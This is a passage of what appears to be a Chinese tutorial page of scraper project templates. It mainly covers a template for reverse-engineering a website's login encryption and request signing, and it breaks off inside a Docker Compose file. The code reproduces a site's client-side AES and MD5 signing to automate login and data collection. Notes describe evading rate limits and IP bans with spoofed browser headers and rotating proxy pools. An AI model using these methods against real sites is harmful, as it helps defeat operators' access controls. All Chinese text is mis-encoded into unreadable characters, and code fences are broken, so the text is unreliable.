æ•°æ®é»˜è®¤ä¿å­˜åœ¨ `data/processed/` ç›®å½•ï¼š

- JSON æ ¼å¼: `list_data.json`
- CSV æ ¼å¼: `list_data.csv`

### æ—¥å¿—æŸ¥çœ‹

æ—¥å¿—ä¿å­˜åœ¨ `logs/` ç›®å½•ï¼š

- INFO æ—¥å¿—: `info_YYYY-MM-DD.log`
- ERROR æ—¥å¿—: `error_YYYY-MM-DD.log`

## License

MIT
\`\`\`

---

## ğŸš€ ä½¿ç”¨æ­¤æ¨¡æ¿

```bash
# 1. å¤åˆ¶æ¨¡æ¿
cp -r templates/basic_scraper my_project
cd my_project

# 2. åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ
python -m venv venv
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate  # Windows

# 3. å®‰è£…ä¾èµ–
pip install -r requirements.txt

# 4. é…ç½®ç¯å¢ƒ
cp .env.example .env
vim .env

# 5. è¿è¡Œ
python main.py
```
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³æ¨¡æ¿</h2>
<ul>
<li><a href="#section-70">é€†å‘åˆ†æé¡¹ç›®</a></li>
<li><a href="#section-71">Docker éƒ¨ç½²</a></li>
<li><a href="#section-73">åˆ†å¸ƒå¼çˆ¬è™«</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-70">
                                                <h2>[R69] Reverse Project</h2>
                                                <h1>R69: é€†å‘åˆ†æé¡¹ç›®æ¨¡æ¿</h1>
<p>Web é€†å‘åˆ†æçš„æ ‡å‡†é¡¹ç›®æ¨¡æ¿ï¼Œå¸®åŠ©ä½ ç³»ç»ŸåŒ–åœ°è¿›è¡Œç½‘ç«™åˆ†æå’Œæ–‡æ¡£è®°å½•ã€‚</p>
<hr />
<h2>ğŸ“ é¡¹ç›®ç»“æ„</h2>
<pre><code>reverse_project/
â”œâ”€â”€ docs/
â”‚   â”œâ”€â”€ analysis.md           # åˆ†ææ–‡æ¡£
â”‚   â”œâ”€â”€ api_reference.md      # API æ¥å£æ–‡æ¡£
â”‚   â”œâ”€â”€ crypto_analysis.md    # åŠ å¯†åˆ†æ
â”‚   â””â”€â”€ findings.md           # å‘ç°å’Œæ€»ç»“
â”œâ”€â”€ scripts/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ decrypt.py            # è§£å¯†è„šæœ¬
â”‚   â”œâ”€â”€ sign.py               # ç­¾åç”Ÿæˆ
â”‚   â””â”€â”€ reproduce.py          # å®Œæ•´å¤ç°
â”œâ”€â”€ hooks/
â”‚   â”œâ”€â”€ network_monitor.js    # ç½‘ç»œç›‘æ§
â”‚   â”œâ”€â”€ crypto_hook.js        # åŠ å¯†å‡½æ•°Hook
â”‚   â””â”€â”€ debugger_bypass.js    # åè°ƒè¯•ç»•è¿‡
â”œâ”€â”€ test_cases/
â”‚   â”œâ”€â”€ test_decrypt.py       # è§£å¯†æµ‹è¯•
â”‚   â”œâ”€â”€ test_sign.py          # ç­¾åæµ‹è¯•
â”‚   â””â”€â”€ test_api.py           # API æµ‹è¯•
â”œâ”€â”€ data/
â”‚   â”œâ”€â”€ samples/              # æ ·æœ¬æ•°æ®
â”‚   â””â”€â”€ results/              # åˆ†æç»“æœ
â”œâ”€â”€ assets/
â”‚   â”œâ”€â”€ screenshots/          # æˆªå›¾
â”‚   â””â”€â”€ diagrams/             # æµç¨‹å›¾
â”œâ”€â”€ requirements.txt
â”œâ”€â”€ README.md
â””â”€â”€ .env.example
</code></pre>
<hr />
<h2>ğŸ“„ æ–‡ä»¶æ¨¡æ¿</h2>
<h3>1. docs/analysis.md</h3>
<pre><code class="language-markdown"># [ç½‘ç«™åç§°] é€†å‘åˆ†æ

## åŸºæœ¬ä¿¡æ¯

| é¡¹ç›®         | è¯´æ˜                                |
| ------------ | ----------------------------------- |
| **ç›®æ ‡ç½‘ç«™** | https://example.com                 |
| **åˆ†ææ—¥æœŸ** | 2024-01-15                          |
| **éš¾åº¦ç­‰çº§** | â­â­â­                              |
| **ä¸»è¦æŠ€æœ¯** | JavaScript æ··æ·†ã€AES åŠ å¯†ã€ç­¾åéªŒè¯ |

---

## ç›®æ ‡

- â˜ åˆ†æç™»å½•æ¥å£åŠ å¯†é€»è¾‘
- â˜ ç ´è§£ API ç­¾åç®—æ³•
- â˜ å®ç°å®Œæ•´çš„ Python å¤ç°
- â˜ ç¼–å†™è‡ªåŠ¨åŒ–çˆ¬è™«

---

## æŠ€æœ¯æ ˆåˆ†æ

### å‰ç«¯æŠ€æœ¯

- **æ¡†æ¶**: Vue.js 3.x
- **æ‰“åŒ…å·¥å…·**: Webpack 5
- **æ··æ·†**: JavaScript Obfuscator

### åç«¯æŠ€æœ¯

- **æœåŠ¡å™¨**: Nginx + Node.js
- **API æ ¼å¼**: RESTful JSON
- **è®¤è¯æ–¹å¼**: JWT Token

---

## åˆ†ææµç¨‹

### 1. åˆæ­¥ä¾¦å¯Ÿ

**å·¥å…·**: Chrome DevTools

1. æ‰“å¼€ç½‘ç«™ï¼Œæ£€æŸ¥ç½‘ç»œè¯·æ±‚
2. è¯†åˆ«å…³é”® API æ¥å£
3. è§‚å¯Ÿè¯·æ±‚å‚æ•°å’Œå“åº”æ ¼å¼

**å‘ç°**:

- ç™»å½•æ¥å£: `/api/auth/login`
- ä¸»è¦å‚æ•°: `username`, `password`, `timestamp`, `sign`

### 2. JavaScript åˆ†æ

**å…¥å£æ–‡ä»¶**: `app.js`

å…³é”®ä»£ç ä½ç½®:

```javascript
// ä½ç½®: app.js:1234
function encryptPassword(password) {
  // AES åŠ å¯†å®ç°
}

// ä½ç½®: app.js:5678
function generateSign(params) {
  // ç­¾åç”Ÿæˆé€»è¾‘
}
```
</code></pre>
<h3>3. åŠ å¯†ç®—æ³•è¯†åˆ«</h3>
<p>è¯¦è§ crypto_analysis.md</p>
<h3>4. å¤ç°å®ç°</h3>
<p>è¯¦è§ <a href="../scripts/reproduce.py">reproduce.py</a></p>
<hr />
<h2>æ—¶é—´çº¿</h2>
<table>
<thead>
<tr>
  <th>æ—¥æœŸ</th>
  <th>è¿›å±•</th>
</tr>
</thead>
<tbody>
<tr>
  <td>2024-01-15</td>
  <td>å®Œæˆåˆæ­¥ä¾¦å¯Ÿ</td>
</tr>
<tr>
  <td>2024-01-16</td>
  <td>è¯†åˆ«åŠ å¯†ç®—æ³•ä¸º AES-128-CBC</td>
</tr>
<tr>
  <td>2024-01-17</td>
  <td>ç ´è§£ç­¾åç®—æ³•</td>
</tr>
<tr>
  <td>2024-01-18</td>
  <td>Python å¤ç°æˆåŠŸ</td>
</tr>
</tbody>
</table>
<hr />
<h2>å‚è€ƒèµ„æº</h2>
<ul>
<li><a href="https://example.com/docs">å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://github.com/...">ç›¸å…³è®¨è®º</a></li>
</ul>
<pre><code>
### 2. docs/crypto_analysis.md

```markdown
# åŠ å¯†åˆ†ææ–‡æ¡£

## å¯†ç åŠ å¯†

### ç®—æ³•è¯†åˆ«

**ç‰¹å¾**:
- è¾“å‡ºé•¿åº¦: 32 å­—ç¬¦ï¼ˆBase64 ç¼–ç ï¼‰
- å›ºå®š IV: `1234567890abcdef`

**ç»“è®º**: AES-128-CBC

### å…³é”®ä»£ç 

```javascript
// åŸå§‹ä»£ç  (app.js:1234)
function encryptPassword(password) {
    const key = CryptoJS.enc.Utf8.parse('secretkey1234567');
    const iv = CryptoJS.enc.Utf8.parse('1234567890abcdef');

    const encrypted = CryptoJS.AES.encrypt(password, key, {
        iv: iv,
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    });

    return encrypted.toString();
}
</code></pre>
<h3>Python å®ç°</h3>
<pre><code class="language-python">from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

def encrypt_password(password):
    key = b'secretkey1234567'
    iv = b'1234567890abcdef'

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(password.encode(), 16))

    return base64.b64encode(encrypted).decode()

# æµ‹è¯•
print(encrypt_password('mypassword'))
</code></pre>
<hr />
<h2>ç­¾åç®—æ³•</h2>
<h3>ç®—æ³•è¯†åˆ«</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>è¾“å‡ºé•¿åº¦: 32 å­—ç¬¦</li>
<li>åå…­è¿›åˆ¶æ ¼å¼</li>
</ul>
<p><strong>ç»“è®º</strong>: MD5</p>
<h3>ç­¾åè§„åˆ™</h3>
<pre><code>sign = MD5(param1 + param2 + timestamp + secret_key)
</code></pre>
<p><strong>å‚æ•°é¡ºåº</strong>: æŒ‰å­—å…¸åºæ’åˆ—</p>
<h3>å®Œæ•´å®ç°</h3>
<pre><code class="language-python">import hashlib
import time

def generate_sign(params):
    # æ·»åŠ æ—¶é—´æˆ³
    params['timestamp'] = int(time.time() * 1000)

    # æŒ‰å­—å…¸åºæ’åº
    sorted_params = sorted(params.items())

    # æ‹¼æ¥å­—ç¬¦ä¸²
    sign_str = ''.join([f'{k}{v}' for k, v in sorted_params])

    # æ·»åŠ å¯†é’¥
    sign_str += 'secret_key_here'

    # MD5 å“ˆå¸Œ
    return hashlib.md5(sign_str.encode()).hexdigest()

# æµ‹è¯•
params = {
    'username': 'admin',
    'password': 'encrypted_password_here'
}
print(generate_sign(params))
</code></pre>
<hr />
<h2>Token æœºåˆ¶</h2>
<h3>JWT ç»“æ„</h3>
<pre><code>Header.Payload.Signature
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NX0.xyz...
</code></pre>
<h3>è§£ç </h3>
<pre><code class="language-python">import jwt

token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;
decoded = jwt.decode(token, verify=False)
print(decoded)
# {'user_id': 12345, 'exp': 1705305600}
</code></pre>
<hr />
<h2>åçˆ¬æªæ–½</h2>
<h3>1. User-Agent æ£€æµ‹</h3>
<ul>
<li><strong>æªæ–½</strong>: å¿…é¡»åŒ…å«çœŸå®æµè§ˆå™¨ UA</li>
<li><strong>ç»•è¿‡</strong>: ä½¿ç”¨çœŸå® Chrome UA</li>
</ul>
<h3>2. é¢‘ç‡é™åˆ¶</h3>
<ul>
<li><strong>æªæ–½</strong>: æ¯åˆ†é’Ÿæœ€å¤š 60 è¯·æ±‚</li>
<li><strong>ç»•è¿‡</strong>: æ·»åŠ éšæœºå»¶è¿Ÿ (1-3 ç§’)</li>
</ul>
<h3>3. IP å°ç¦</h3>
<ul>
<li><strong>æªæ–½</strong>: åŒä¸€ IP è¿‡å¤šè¯·æ±‚ä¼šè¢«å°</li>
<li><strong>ç»•è¿‡</strong>: ä½¿ç”¨ä»£ç†æ± è½®æ¢</li>
</ul>
<pre><code>
### 3. scripts/reproduce.py

```python
&quot;&quot;&quot;
å®Œæ•´å¤ç°è„šæœ¬
&quot;&quot;&quot;
import requests
import hashlib
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import json


class TargetAPI:
    &quot;&quot;&quot;ç›®æ ‡ç½‘ç«™ API å°è£…&quot;&quot;&quot;

    def __init__(self):
        self.base_url = &quot;https://example.com&quot;
        self.session = requests.Session()
        self.token = None

        # è®¾ç½®è¯·æ±‚å¤´
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        })

    def encrypt_password(self, password: str) -&gt; str:
        &quot;&quot;&quot;
        AES åŠ å¯†å¯†ç 

        Args:
            password: æ˜æ–‡å¯†ç 

        Returns:
            åŠ å¯†åçš„ Base64 å­—ç¬¦ä¸²
        &quot;&quot;&quot;
        key = b'secretkey1234567'
        iv = b'1234567890abcdef'

        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(password.encode(), 16))

        return base64.b64encode(encrypted).decode()

    def generate_sign(self, params: dict) -&gt; dict:
        &quot;&quot;&quot;
        ç”Ÿæˆç­¾å

        Args:
            params: è¯·æ±‚å‚æ•°

        Returns:
            æ·»åŠ äº† timestamp å’Œ sign çš„å‚æ•°å­—å…¸
        &quot;&quot;&quot;
        # æ·»åŠ æ—¶é—´æˆ³
        params['timestamp'] = int(time.time() * 1000)

        # æŒ‰å­—å…¸åºæ’åº
        sorted_params = sorted(params.items())

        # æ‹¼æ¥å­—ç¬¦ä¸²
        sign_str = ''.join([f'{k}{v}' for k, v in sorted_params])

        # æ·»åŠ å¯†é’¥
        sign_str += 'secret_key_here'

        # MD5 å“ˆå¸Œ
        params['sign'] = hashlib.md5(sign_str.encode()).hexdigest()

        return params

    def login(self, username: str, password: str) -&gt; bool:
        &quot;&quot;&quot;
        ç™»å½•

        Args:
            username: ç”¨æˆ·å
            password: å¯†ç 

        Returns:
            æ˜¯å¦ç™»å½•æˆåŠŸ
        &quot;&quot;&quot;
        # åŠ å¯†å¯†ç 
        encrypted_password = self.encrypt_password(password)

        # å‡†å¤‡å‚æ•°
        params = {
            'username': username,
            'password': encrypted_password
        }

        # ç”Ÿæˆç­¾å
        params = self.generate_sign(params)

        # å‘é€è¯·æ±‚
        url = f&quot;{self.base_url}/api/auth/login&quot;
        response = self.session.post(url, json=params)

        if response.status_code == 200:
            data = response.json()
            if data.get('code') == 0:
                self.token = data['data']['token']
                self.session.headers['Authorization'] = f'Bearer {self.token}'
                print(f&quot;âœ… ç™»å½•æˆåŠŸ! Token: {self.token[:20]}...&quot;)
                return True

        print(f&quot;âŒ ç™»å½•å¤±è´¥: {response.text}&quot;)
        return False

    def get_user_info(self) -&gt; dict:
        &quot;&quot;&quot;
        è·å–ç”¨æˆ·ä¿¡æ¯

        Returns:
            ç”¨æˆ·ä¿¡æ¯å­—å…¸
        &quot;&quot;&quot;
        if not self.token:
            raise Exception(&quot;æœªç™»å½•ï¼Œè¯·å…ˆè°ƒç”¨ login()&quot;)

        url = f&quot;{self.base_url}/api/user/info&quot;
        response = self.session.get(url)

        if response.status_code == 200:
            return response.json()

        return None

    def get_data(self, page: int = 1, size: int = 20) -&gt; list:
        &quot;&quot;&quot;
        è·å–æ•°æ®åˆ—è¡¨

        Args:
            page: é¡µç 
            size: æ¯é¡µæ•°é‡

        Returns:
            æ•°æ®åˆ—è¡¨
        &quot;&quot;&quot;
        if not self.token:
            raise Exception(&quot;æœªç™»å½•ï¼Œè¯·å…ˆè°ƒç”¨ login()&quot;)

        params = {
            'page': page,
            'size': size
        }

        # ç”Ÿæˆç­¾å
        params = self.generate_sign(params)

        url = f&quot;{self.base_url}/api/data/list&quot;
        response = self.session.get(url, params=params)

        if response.status_code == 200:
            data = response.json()
            return data.get('data', {}).get('items', [])

        return []


def main():
    &quot;&quot;&quot;ä¸»å‡½æ•°&quot;&quot;&quot;
    print(&quot;=&quot; * 50)
    print(&quot;ç›®æ ‡ç½‘ç«™ API å¤ç°æµ‹è¯•&quot;)
    print(&quot;=&quot; * 50)

    # åˆ›å»º API å®ä¾‹
    api = TargetAPI()

    # ç™»å½•
    if api.login('your_username', 'your_password'):
        # è·å–ç”¨æˆ·ä¿¡æ¯
        user_info = api.get_user_info()
        print(f&quot;\nç”¨æˆ·ä¿¡æ¯: {json.dumps(user_info, indent=2, ensure_ascii=False)}&quot;)

        # è·å–æ•°æ®
        data = api.get_data(page=1, size=10)
        print(f&quot;\nè·å–åˆ° {len(data)} æ¡æ•°æ®&quot;)

        # ä¿å­˜æ•°æ®
        with open('data/results/output.json', 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)

        print(&quot;\nâœ… æ•°æ®å·²ä¿å­˜åˆ° data/results/output.json&quot;)


if __name__ == '__main__':
    main()
</code></pre>
<h3>4. test_cases/test_decrypt.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
è§£å¯†åŠŸèƒ½æµ‹è¯•
&quot;&quot;&quot;
import unittest
from scripts.reproduce import TargetAPI


class TestDecrypt(unittest.TestCase):
    &quot;&quot;&quot;è§£å¯†æµ‹è¯•ç”¨ä¾‹&quot;&quot;&quot;

    def setUp(self):
        &quot;&quot;&quot;åˆå§‹åŒ–&quot;&quot;&quot;
        self.api = TargetAPI()

    def test_encrypt_password(self):
        &quot;&quot;&quot;æµ‹è¯•å¯†ç åŠ å¯†&quot;&quot;&quot;
        password = &quot;test123&quot;
        encrypted = self.api.encrypt_password(password)

        # éªŒè¯è¾“å‡ºæ ¼å¼
        self.assertIsInstance(encrypted, str)
        self.assertGreater(len(encrypted), 0)

        # éªŒè¯ Base64 æ ¼å¼
        import base64
        try:
            base64.b64decode(encrypted)
            is_base64 = True
        except:
            is_base64 = False

        self.assertTrue(is_base64)

        print(f&quot;âœ… åŠ å¯†æµ‹è¯•é€šè¿‡: {password} -&gt; {encrypted}&quot;)

    def test_sign_generation(self):
        &quot;&quot;&quot;æµ‹è¯•ç­¾åç”Ÿæˆ&quot;&quot;&quot;
        params = {
            'username': 'test',
            'password': 'encrypted_pass'
        }

        signed_params = self.api.generate_sign(params.copy())

        # éªŒè¯ç­¾åå­—æ®µå­˜åœ¨
        self.assertIn('sign', signed_params)
        self.assertIn('timestamp', signed_params)

        # éªŒè¯ç­¾åæ ¼å¼ (32ä½ MD5)
        self.assertEqual(len(signed_params['sign']), 32)
        self.assertTrue(signed_params['sign'].isalnum())

        print(f&quot;âœ… ç­¾åæµ‹è¯•é€šè¿‡: {signed_params['sign']}&quot;)

    def test_sign_consistency(self):
        &quot;&quot;&quot;æµ‹è¯•ç­¾åä¸€è‡´æ€§&quot;&quot;&quot;
        params = {
            'username': 'test',
            'password': 'encrypted_pass',
            'timestamp': 1234567890000
        }

        # åŒæ ·çš„å‚æ•°åº”è¯¥ç”ŸæˆåŒæ ·çš„ç­¾å
        sign1 = self.api.generate_sign(params.copy())['sign']
        sign2 = self.api.generate_sign(params.copy())['sign']

        self.assertEqual(sign1, sign2)

        print(f&quot;âœ… ç­¾åä¸€è‡´æ€§æµ‹è¯•é€šè¿‡&quot;)


if __name__ == '__main__':
    unittest.main()
</code></pre>
<h3>5. README.md</h3>
<pre><code class="language-markdown"># [ç½‘ç«™åç§°] é€†å‘åˆ†æé¡¹ç›®

æœ¬é¡¹ç›®æ˜¯å¯¹ [ç›®æ ‡ç½‘ç«™] çš„å®Œæ•´é€†å‘åˆ†æå’Œ Python å¤ç°å®ç°ã€‚

---

## é¡¹ç›®æ¦‚è¿°

**ç›®æ ‡**: åˆ†æå¹¶å¤ç°ç›®æ ‡ç½‘ç«™çš„ç™»å½•ã€æ•°æ®è·å–ç­‰æ ¸å¿ƒåŠŸèƒ½

**ä¸»è¦æˆæœ**:

- âœ… ç ´è§£ AES-128-CBC å¯†ç åŠ å¯†
- âœ… é€†å‘ MD5 ç­¾åç®—æ³•
- âœ… å®ç°å®Œæ•´çš„ Python API å°è£…
- âœ… ç¼–å†™è¯¦ç»†çš„åˆ†ææ–‡æ¡£

---

## å¿«é€Ÿå¼€å§‹

### 1. å®‰è£…ä¾èµ–

```bash
pip install -r requirements.txt
```
</code></pre>
<h3>2. é…ç½®å‚æ•°</h3>
<pre><code class="language-bash">cp .env.example .env
# ç¼–è¾‘ .env æ–‡ä»¶ï¼Œå¡«å…¥è´¦å·å¯†ç 
</code></pre>
<h3>3. è¿è¡Œå¤ç°è„šæœ¬</h3>
<pre><code class="language-bash">python scripts/reproduce.py
</code></pre>
<hr />
<h2>é¡¹ç›®ç»“æ„</h2>
<pre><code>.
â”œâ”€â”€ docs/              # åˆ†ææ–‡æ¡£
â”œâ”€â”€ scripts/           # å¤ç°è„šæœ¬
â”œâ”€â”€ hooks/             # Hook è„šæœ¬
â”œâ”€â”€ test_cases/        # æµ‹è¯•ç”¨ä¾‹
â”œâ”€â”€ data/              # æ•°æ®ç›®å½•
â””â”€â”€ assets/            # èµ„æºæ–‡ä»¶
</code></pre>
<hr />
<h2>åˆ†ææ–‡æ¡£</h2>
<p>è¯¦ç»†çš„åˆ†æè¿‡ç¨‹è§:</p>
<ul>
<li><a href="#section-30">å®Œæ•´åˆ†ææ–‡æ¡£</a></li>
<li>åŠ å¯†ç®—æ³•åˆ†æ</li>
<li>API æ¥å£æ–‡æ¡£</li>
</ul>
<hr />
<h2>ä¸»è¦æŠ€æœ¯</h2>
<ul>
<li><strong>åŠ å¯†</strong>: AES-128-CBC</li>
<li><strong>ç­¾å</strong>: MD5 å“ˆå¸Œ</li>
<li><strong>è®¤è¯</strong>: JWT Token</li>
<li><strong>åæ··æ·†</strong>: AST è§£æ</li>
</ul>
<hr />
<h2>ä½¿ç”¨ç¤ºä¾‹</h2>
<pre><code class="language-python">from scripts.reproduce import TargetAPI

# åˆ›å»º API å®ä¾‹
api = TargetAPI()

# ç™»å½•
api.login('username', 'password')

# è·å–æ•°æ®
data = api.get_data(page=1, size=20)

print(f&quot;è·å–åˆ° {len(data)} æ¡æ•°æ®&quot;)
</code></pre>
<hr />
<h2>è¿è¡Œæµ‹è¯•</h2>
<pre><code class="language-bash">python -m pytest test_cases/
</code></pre>
<hr />
<h2>æ³¨æ„äº‹é¡¹</h2>
<ol>
<li>æœ¬é¡¹ç›®ä»…ä¾›å­¦ä¹ ç ”ç©¶ä½¿ç”¨</li>
<li>è¯·éµå®ˆç›®æ ‡ç½‘ç«™çš„ä½¿ç”¨æ¡æ¬¾</li>
<li>ä¸è¦ç”¨äºéæ³•ç”¨é€”</li>
<li>å»ºè®®æ·»åŠ è¯·æ±‚å»¶è¿Ÿï¼Œé¿å…å¯¹æœåŠ¡å™¨é€ æˆå‹åŠ›</li>
</ol>
<hr />
<h2>License</h2>
<p>MIT</p>
<pre><code>
### 6. requirements.txt

```txt
requests&gt;=2.31.0
pycryptodome&gt;=3.19.0
pyjwt&gt;=2.8.0
beautifulsoup4&gt;=4.12.0
pytest&gt;=7.4.0
python-dotenv&gt;=1.0.0
</code></pre>
<h3>7. .env.example</h3>
<pre><code class="language-bash"># ç›®æ ‡ç½‘ç«™è´¦å·
USERNAME=your_username
PASSWORD=your_password

# è¯·æ±‚é…ç½®
REQUEST_TIMEOUT=30
MAX_RETRIES=3

# ä»£ç†é…ç½® (å¯é€‰)
USE_PROXY=false
PROXY_URL=http://127.0.0.1:7890
</code></pre>
<hr />
<h2>ğŸš€ ä½¿ç”¨æ­¤æ¨¡æ¿</h2>
<pre><code class="language-bash"># 1. å¤åˆ¶æ¨¡æ¿
cp -r templates/reverse_project my_analysis
cd my_analysis

# 2. åˆå§‹åŒ–æ–‡æ¡£
vim docs/analysis.md  # å¼€å§‹è®°å½•åˆ†æè¿‡ç¨‹

# 3. ç¼–å†™å¤ç°è„šæœ¬
vim scripts/reproduce.py

# 4. è¿è¡Œæµ‹è¯•
python -m pytest test_cases/
</code></pre>
<hr />
<h2>ğŸ’¡ æœ€ä½³å®è·µ</h2>
<h3>åˆ†ææµç¨‹å»ºè®®</h3>
<ol>
<li><p><strong>åˆæ­¥ä¾¦å¯Ÿ</strong> (1-2 å°æ—¶)</p>
<ul>
<li>ä½¿ç”¨ DevTools è§‚å¯Ÿç½‘ç»œè¯·æ±‚</li>
<li>è¯†åˆ«å…³é”® API æ¥å£</li>
<li>è®°å½•è¯·æ±‚å‚æ•°æ ¼å¼</li>
</ul>
</li>
<li><p><strong>JavaScript åˆ†æ</strong> (2-4 å°æ—¶)</p>
<ul>
<li>å®šä½åŠ å¯†ç›¸å…³ä»£ç </li>
<li>ä½¿ç”¨æ–­ç‚¹è°ƒè¯•</li>
<li>è®°å½•å…³é”®å‡½æ•°ä½ç½®</li>
</ul>
</li>
<li><p><strong>ç®—æ³•è¯†åˆ«</strong> (1-2 å°æ—¶)</p>
<ul>
<li>æ ¹æ®ç‰¹å¾è¯†åˆ«åŠ å¯†ç®—æ³•</li>
<li>æµ‹è¯•éªŒè¯çŒœæµ‹</li>
<li>æå–å¯†é’¥å’Œå‚æ•°</li>
</ul>
</li>
<li><p><strong>Python å¤ç°</strong> (2-3 å°æ—¶)</p>
<ul>
<li>å®ç°åŠ å¯†å‡½æ•°</li>
<li>å®ç°ç­¾åå‡½æ•°</li>
<li>å°è£…å®Œæ•´ API</li>
</ul>
</li>
<li><p><strong>æµ‹è¯•éªŒè¯</strong> (1 å°æ—¶)</p>
<ul>
<li>ç¼–å†™å•å…ƒæµ‹è¯•</li>
<li>å¯¹æ¯”è¾“å‡ºç»“æœ</li>
<li>ä¿®å¤é—®é¢˜</li>
</ul>
</li>
</ol>
<h3>æ–‡æ¡£æ’°å†™å»ºè®®</h3>
<ul>
<li><strong>åŠæ—¶è®°å½•</strong>: æ¯ä¸ªå‘ç°éƒ½è¦ç«‹å³è®°å½•</li>
<li><strong>ä»£ç æ³¨é‡Š</strong>: æ ‡æ³¨åŸå§‹ä»£ç ä½ç½® (æ–‡ä»¶å:è¡Œå·)</li>
<li><strong>æˆªå›¾ä¿å­˜</strong>: é‡è¦æ­¥éª¤ä¿å­˜æˆªå›¾åˆ° assets/</li>
<li><strong>æ—¶é—´çº¿</strong>: è®°å½•åˆ†æè¿›åº¦æ—¶é—´çº¿</li>
</ul>
<hr />
<h2>ğŸ“š ç›¸å…³èµ„æº</h2>
<ul>
<li><a href="#section-69">åŸºç¡€çˆ¬è™«é¡¹ç›®</a></li>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-29">åŠ å¯†è¯†åˆ«</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-71">
                                                <h2>[R70] Docker Setup</h2>
                                                <h1>R70: Docker éƒ¨ç½²é…ç½®æ¨¡æ¿</h1>
<p>å®¹å™¨åŒ–éƒ¨ç½²çˆ¬è™«é¡¹ç›®çš„å®Œæ•´é…ç½®ï¼Œæ”¯æŒå•æœºå’Œåˆ†å¸ƒå¼éƒ¨ç½²ã€‚</p>
<hr />
<h2>ğŸ“ é¡¹ç›®ç»“æ„</h2>
<pre><code>docker_scraper/
â”œâ”€â”€ app/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ main.py
â”‚   â”œâ”€â”€ config.py
â”‚   â””â”€â”€ scraper.py
â”œâ”€â”€ docker/
â”‚   â”œâ”€â”€ Dockerfile
â”‚   â”œâ”€â”€ Dockerfile.dev
â”‚   â””â”€â”€ docker-compose.yml
â”œâ”€â”€ scripts/
â”‚   â”œâ”€â”€ entrypoint.sh
â”‚   â””â”€â”€ wait-for-it.sh
â”œâ”€â”€ nginx/
â”‚   â””â”€â”€ nginx.conf
â”œâ”€â”€ .env.example
â”œâ”€â”€ .dockerignore
â””â”€â”€ README.md
</code></pre>
<hr />
<h2>ğŸ“„ é…ç½®æ–‡ä»¶</h2>
<h3>1. Dockerfile (ç”Ÿäº§ç¯å¢ƒ)</h3>
<pre><code class="language-dockerfile"># åŸºç¡€é•œåƒ
FROM python:3.11-slim

# è®¾ç½®ç¯å¢ƒå˜é‡
ENV PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_DISABLE_PIP_VERSION_CHECK=1

# è®¾ç½®å·¥ä½œç›®å½•
WORKDIR /app

# å®‰è£…ç³»ç»Ÿä¾èµ–
RUN apt-get update &amp;&amp; apt-get install -y \
    gcc \
    g++ \
    curl \
    wget \
    &amp;&amp; rm -rf /var/lib/apt/lists/*

# å¤åˆ¶ä¾èµ–æ–‡ä»¶
COPY requirements.txt .

# å®‰è£… Python ä¾èµ–
RUN pip install --no-cache-dir -r requirements.txt

# å¤åˆ¶é¡¹ç›®æ–‡ä»¶
COPY . .

# åˆ›å»ºé root ç”¨æˆ·
RUN useradd -m -u 1000 scraper &amp;&amp; \
    chown -R scraper:scraper /app

# åˆ‡æ¢ç”¨æˆ·
USER scraper

# æš´éœ²ç«¯å£
EXPOSE 8000

# å¥åº·æ£€æŸ¥
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD python -c &quot;import sys; sys.exit(0)&quot;

# å¯åŠ¨å‘½ä»¤
CMD [&quot;python&quot;, &quot;app/main.py&quot;]
</code></pre>
<h3>2. Dockerfile.dev (å¼€å‘ç¯å¢ƒ)</h3>
<pre><code class="language-dockerfile">FROM python:3.11-slim

ENV PYTHONUNBUFFERED=1

WORKDIR /app

# å®‰è£…å¼€å‘å·¥å…·
RUN apt-get update &amp;&amp; apt-get install -y \
    gcc \
    g++ \
    curl \
    wget \
    vim \
    git \
    &amp;&amp; rm -rf /var/lib/apt/lists/*

COPY requirements.txt requirements-dev.txt ./

RUN pip install --no-cache-dir -r requirements.txt &amp;&amp; \
    pip install --no-cache-dir -r requirements-dev.txt

# ä¸å¤åˆ¶ä»£ç ï¼Œä½¿ç”¨ volume æŒ‚è½½
VOLUME /app

CMD [&quot;python&quot;, &quot;app/main.py&quot;]
</code></pre>
<h3>3. docker-compose.yml</h3>
<pre><code class="language-yaml">version: &quot;3.8&quot;

services:
  # çˆ¬è™«åº”ç”¨
  scraper:
    build:
      context: .
      dockerfile: docker/Dockerfile
    container_name: scraper_app
    restart: unless-stopped
    environment:
      - MONGODB_URI=mongodb://mongodb:27017/
      - REDIS_HOST=redis
      - REDIS_PORT=6379
      - LOG_LEVEL=INFO
    volumes:
      - ./data:/app/data
      - ./logs:/app/logs
    depends_on:
      mongodb:
        condition: service_healthy
      redis:
        condition: service_healthy
    networks:
      - scraper_network
    labels:
      - &quot;com.scraper.description=Main scraper service&quot;

  # MongoDB æ•°æ®åº“
  mongodb:
    image: mongo:7.0
    container_name: scraper_mongodb
    restart: unless-stopped
    environment:
      MONGO_INITDB_ROOT_USERNAME: admin
